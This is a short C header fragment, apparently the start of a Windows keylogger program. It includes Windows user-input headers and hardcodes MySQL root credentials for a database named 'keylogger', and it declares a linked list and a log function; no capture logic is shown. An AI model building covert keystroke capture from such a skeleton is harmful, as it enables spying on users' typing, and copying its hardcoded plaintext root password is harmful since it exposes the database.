#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <stdbool.h>
#include <string.h>
#include "mysql.h"
#define SERVIDOR "localhost"
#define USUARIO "root"
#define SENHA "abzdwe123"
#define BD "keylogger" 

struct lista {
	char* info;
	size_t length;
	struct lista* prox;
};

void log(LPVOID);
struct lista* inserir(struct lista* lst, char* info);
char* toString(struct lista* lst);